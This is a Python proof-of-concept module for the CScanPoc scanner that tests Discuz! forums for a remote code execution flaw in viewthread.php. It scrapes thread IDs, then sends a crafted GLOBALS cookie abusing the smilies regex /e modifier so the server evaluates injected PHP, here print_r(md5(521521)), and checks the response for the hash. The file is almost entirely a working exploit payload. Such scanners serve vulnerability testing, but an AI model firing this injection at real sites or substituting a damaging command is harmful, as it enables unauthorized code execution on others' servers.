# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Discuz_0023'  # 平台漏洞编号，留空
    name = 'Discuz 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        Discuz! /viewthread.php 命令执行漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz!'  # 漏洞应用版本

hh = hackhttp.hackhttp()
def gettid(args):
    code, head, content, errcode, finalurl = hh.http(args)
    if code == 200:
        tids = re.findall(r'viewthread.php\?tid=(\d+)', content)
        if tids:
            return tids
        tids = re.findall(r'thread-(\d+)-', content)
        if tids:
            return tids

class Poc(ABPoc):
    poc_id = '8af0cc18-9be0-461e-a145-6c0e48114ed9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            tids = gettid(self.target)
            if tids:
                cookie = 'GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5bsearcharray%5d=/.*/eui;GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5breplacearray%5d=print_r(md5(521521))'
                for tid in tids:
                    #帖子中必须有表情images/smilies,才会触发漏洞
                    payload = '/viewthread.php?tid=' + tid
                    verify_url = self.target + payload
                    code, head, content, errcode, finalurl = hh.http(verify_url, cookie=cookie)
                    if code==200:
                        if '35fd19fbe470f0cb5581884fa700610f' in content:
                            #security_hole(verify_url)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                            break
                

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
